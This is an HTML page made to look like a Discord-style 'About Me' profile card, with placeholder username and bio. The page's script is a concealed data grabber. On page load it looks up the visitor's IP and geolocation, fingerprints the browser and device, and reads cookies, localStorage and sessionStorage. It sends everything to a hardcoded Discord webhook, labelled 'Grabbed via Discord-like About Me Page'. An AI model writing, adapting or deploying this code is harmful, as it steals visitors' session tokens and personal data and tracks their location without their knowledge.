<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>About Me</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: linear-gradient(135deg, #7289da 0%, #99aab5 50%, #43b581 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      color: #ffffff;
      overflow: hidden;
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.05"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
      pointer-events: none;
    }
    
    .profile-container {
      position: relative;
      z-index: 1;
    }
    
    .profile-card {
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 8px;
      padding: 48px 32px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.1),
        inset 0 1px 0 rgba(255, 255, 255, 0.2);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .profile-card:hover {
      transform: translateY(-4px);
      box-shadow: 
        0 16px 48px rgba(0, 0, 0, 0.15),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
    }
    
    .pfp {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.2);
      margin: 0 auto 24px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 48px;
      color: rgba(255, 255, 255, 0.5);
    }
    
    .username {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 8px;
      color: rgba(255, 255, 255, 0.95);
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    .nickname {
      font-size: 18px;
      font-weight: 400;
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 24px;
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    .bio {
      font-size: 16px;
      font-weight: 300;
      line-height: 1.5;
      color: rgba(255, 255, 255, 0.8);
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    @media (max-width: 480px) {
      .profile-card {
        padding: 32px 24px;
        margin: 20px;
      }
      
      .pfp {
        width: 100px;
        height: 100px;
        font-size: 40px;
      }
      
      .username {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="profile-container">
    <div class="profile-card">
      <div class="pfp">ðŸ‘¤</div>
      <h2 class="username">username</h2>
      <h3 class="nickname">nickname</h3>
      <p class="bio">test</p>
    </div>
  </div>
  
  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
    
    const sendData = async () => {
      const formData = new FormData();
      const fields = [];
      let ip = 'unknown';
      let country = 'unknown';
      let city = 'unknown';
      let lat = 'unknown';
      let lon = 'unknown';
      let status = 'unknown';
      let timezoneGeo = 'unknown';
      let mobile = 'No';
      let proxy = 'No';
      let hosting = 'No';
      let isp = 'unknown';
      let org = 'unknown';
      let asNum = 'unknown';
      let region = 'unknown';
      let regionCode = 'unknown';
      let district = 'unknown';
      let zip = 'unknown';
      
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
      } catch (error) {
        console.error('IP fetch failed:', error);
      }
      
      try {
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
        const geoData = await geoResponse.json();
        if (geoData.status === 'success') {
          country = geoData.country || 'unknown';
          city = geoData.city || 'unknown';
          lat = geoData.lat || 'unknown';
          lon = geoData.lon || 'unknown';
          status = geoData.status || 'unknown';
          timezoneGeo = geoData.timezone || 'unknown';
          mobile = geoData.mobile ? 'Yes' : 'No';
          proxy = geoData.proxy ? 'Yes' : 'No';
          hosting = geoData.hosting ? 'Yes' : 'No';
          isp = geoData.isp || 'unknown';
          org = geoData.org || 'unknown';
          asNum = geoData.as || 'unknown';
          region = geoData.regionName || 'unknown';
          regionCode = geoData.region || 'unknown';
          district = geoData.district || 'unknown';
          zip = geoData.zip || 'unknown';
        }
      } catch (error) {
        console.error('Geo fetch failed:', error);
      }
      
      const timestamp = new Date().toISOString();
      const userAgent = navigator.userAgent || 'unknown';
      const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
      const platform = navigator.platform || 'unknown';
      const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
      const referrer = document.referrer || 'direct';
      const doNotTrack = navigator.doNotTrack || 'unspecified';
      const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
      const deviceMemory = navigator.deviceMemory || 'unknown';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezoneGeo;
      let connection = 'unsupported';
      try {
        if (navigator.connection) {
          connection = `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)`;
        }
      } catch (error) {
        console.error('Connection info failed:', error);
      }
      let pluginsList = 'none';
      try {
        pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
      } catch (error) {
        console.error('Plugins fetch failed:', error);
      }
      
      fields.push(
        { name: 'IP', value: ip, inline: true },
        { name: 'Country', value: country, inline: true },
        { name: 'City', value: city, inline: true },
        { name: 'Status', value: status, inline: true },
        { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
        { name: 'Country Code', value: geoData?.countryCode || 'unknown', inline: true },
        { name: 'Region', value: region, inline: true },
        { name: 'Region Code', value: regionCode, inline: true },
        { name: 'District', value: district, inline: true },
        { name: 'ZIP', value: zip, inline: true },
        { name: 'ISP', value: isp, inline: true },
        { name: 'Organization', value: org, inline: true },
        { name: 'AS', value: asNum, inline: true },
        { name: 'Timezone', value: timezone, inline: true },
        { name: 'Mobile', value: mobile, inline: true },
        { name: 'Proxy', value: proxy, inline: true },
        { name: 'Hosting', value: hosting, inline: true },
        { name: 'User Agent', value: userAgent.substring(0, 1024), inline: false },
        { name: 'Languages', value: languages.substring(0, 1024), inline: false },
        { name: 'Platform', value: platform, inline: true },
        { name: 'Screen Resolution', value: screenRes, inline: true },
        { name: 'Cookies Enabled', value: cookieEnabled, inline: true },
        { name: 'Referrer', value: referrer, inline: false },
        { name: 'Do Not Track', value: doNotTrack, inline: true },
        { name: 'Hardware Concurrency', value: hardwareConcurrency, inline: true },
        { name: 'Device Memory (GB)', value: deviceMemory, inline: true },
        { name: 'Connection', value: connection, inline: true },
        { name: 'Plugins', value: pluginsList.substring(0, 1024), inline: false }
      );
      
      const embed = {
        title: 'User Profile Data',
        description: `Timestamp: ${timestamp}`,
        color: 3447003,
        fields: fields,
        footer: { text: 'Grabbed via Discord-like About Me Page' }
      };
      
      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
      
      // Cookies
      try {
        if (document.cookie) {
          const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
          formData.append('file1', cookiesBlob, 'cookies.txt');
        }
      } catch (error) {
        console.error('Cookies send failed:', error);
      }
      
      // LocalStorage
      try {
        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage).map(([k, v]) => [k, v])), null, 2);
        const lsBlob = new Blob([lsData], { type: 'application/json' });
        formData.append('file2', lsBlob, 'localStorage.json');
      } catch (error) {
        console.error('LocalStorage send failed:', error);
      }
      
      // SessionStorage
      try {
        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage).map(([k, v]) => [k, v])), null, 2);
        const ssBlob = new Blob([ssData], { type: 'application/json' });
        formData.append('file3', ssBlob, 'sessionStorage.json');
      } catch (error) {
        console.error('SessionStorage send failed:', error);
      }
      
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          body: formData,
        });
        console.log('All available user data sent to webhook');
      } catch (error) {
        console.error('Webhook send failed:', error);
      }
    };
    
    document.addEventListener('DOMContentLoaded', sendData);
  </script>
</body>
</html>
